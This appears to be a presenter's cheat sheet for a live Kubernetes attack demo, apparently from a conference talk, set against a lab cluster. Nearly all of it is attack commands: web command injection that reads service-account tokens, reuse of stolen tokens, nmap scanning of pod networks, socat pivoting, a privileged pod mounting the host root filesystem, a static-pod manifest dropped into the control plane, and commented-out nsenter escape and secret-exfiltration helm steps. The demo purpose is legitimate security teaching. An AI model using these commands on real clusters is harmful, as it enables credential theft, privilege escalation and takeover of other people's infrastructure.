Cheat sheet
===========


# setup

Run slides in 1

Run web in 2

Run terminal in 3 - run ./setup.sh in 3 and then `source ./setup_kubectl.sh`





# DEMO

## demo ls
```
?cmd=ls
```
## get token
```
?cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token

```
save results to your kubeconfig (e.g. demokubeconfig if you used `setup_kubeconfig.sh`)





## Curl endpoints with token
```
?cmd=curl --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" https://kubernetes.default.svc.cluster.local/api/v1/namespaces/default/endpoints

```

OR
 
```
?cmd=curl --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" https://10.3.240.1/api/v1/namespaces/default/endpoints

```
## Save endpoint into kubeconfig file

```
>vim $KUBECONFIG
/token
CTRL w CTRL w CTRL D CTRL SHIFT V
```

<!-- Should be able to do export TOKEN=... but it's flaky -->

## Test access

```
kubectl get po 
```
<!-- shouldn't work -->

```
kubectl get po -n secure

```
<!-- should show a single service -->

## demo some things

```
kubectl auth can-i get pods 
kubectl auth can-i --list 

```

```
kubectl-access_matrix -n default
kubectl-access_matrix -n secure

```

```
kubectl exec -it -n secure webadmin- -- /bin/sh
```

# Try to deploy to busy box but it will fail

```
kubectl create deployment test1 --image=busybox -n secure

```

```
kubectl describe -n secure pod test\t 

```
Show that the pod failed due to the PSP







# deploy with brick as nonroot 


```
kubectl create deployment myspecialshell --image=antitree/brick -n secure

```
<!-- kubectl run myspecialshell --image=antitree/brick -n secure -->

<!-- kubectl run myspecialshell --generator=run-pod/v1 --image=gcr.io/shmoocon-talk-hacking/brick -n secure -->

# Create connection to server on port 8080

```
kubectl port-forward -n secure myspecialshell 8080

```






# Find neighboring pods
## Get local IP

```
ifconfig
```
<!-- find your subnet -->

## Scan for other hosts

```
sudo nmap -sS -PN -n --open -p 5000 10.24.0.0/16 -T5
```

<!-- find the IP that's in the secure domain -->








# Find the IPs to target
{{ PASTE THE TARGET HERE}}

```
export TARGET={{TARGET}}

```
## Extract other tokens
NOTE BASIC AUTH

```
curl -u antitree:password http://${TARGET}:5000/\?cmd=cat%20/var/run/secrets/kubernetes.io/serviceaccount/token

```

<!-- curl -u antitree:password http://${TARGET}:5000/\?cmd=cat%20/var/run/secrets/kubernetes.io/serviceaccount/token

curl -u antitree:password http://10.0.1.5:5000/\?cmd=cat%20/var/run/secrets/kubernetes.io/serviceaccount/token

curl http://10.24.1.4:5000/\?cmd=cat%20/var/run/secrets/kubernetes.io/serviceaccount/token -->

## Verify the namespace

```
curl -u antitree:password http://${TARGET}:5000/?cmd=cat%20/var/run/secrets/kubernetes.io/serviceaccount/namespace
```
<!-- Should say default -->

# save the ip address found and confirmed
<!-- 10.24.1.3 -->










# find the secret admin server

```
kubectl-net_forward -n secure
```

```
kubectl run -n secure --restart=Never --image=alpine/socat socat1 -- -d -d tcp-listen:9999,fork,reuseaddr tcp-connect:10.24.0.7:5000 
kubectl wait --for=condition=Ready pod/socat1
kubectl port-forward pod/socat1 9999:9999 -n secure
```

# steal token again outside that context

```
?cmd=cat%20/var/run/secrets/kubernetes.io/serviceaccount/token
```









# replace local kubeconfig file with new token

```
vi ./kubeconfig
```
## Demo access

```
kubectl get po -n secure
```
<!-- shouldn't work -->


```
kubectl get po -n default
```

<!-- should work -->








# Deploy brick as priv'd

```
kubectl apply -f brickpriv.yaml -n default --validate=false

kubectl port-forward -n default brickprivpod 8080
```

## Chroot the env

```
sudo chroot /chroot
```








## Take over the container with kubectl
<!-- #curl -k -LO https://storage.googleapis.com/kubernetes-release/release/v1.17.0/bin/linux/amd64/kubectl && chmod +x ./kubectl
/home/kubernetes/bin/kubectl --kubeconfig /var/lib/kubelet/kubeconfig get po --all-namespaces -->

<!-- ```
./kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'

``` -->


```
alias kubectl=/home/kubernetes/bin/kubectl
export KUBECONFIG=/var/lib/kubelet/kubeconfig 
```

```
echo 'apiVersion: v1
kind: Pod
metadata:
  name: bad-priv2
  namespace: kube-system
spec:
  containers:
  - name: bad
    hostPID: true
    image: antitree/brick
    stdin: true
    tty: true
    imagePullPolicy: IfNotPresent
    volumeMounts:
      - mountPath: /chroot
        name: host
  securityContext:
    privileged: true
  volumes:
  - name: host
    hostPath:
      path: /
      type: Directory
' > /etc/kubernetes/manifests/hacked.yaml
```
kubectl get po -n kube-system










<!-- ./helm2 repo add ropnop https://ropnop.github.io/pentest_charts/
./helm2 install ropnop/exfil_secrets    -->

## Cleanup
gcloud container clusters delete standard-cluster-1
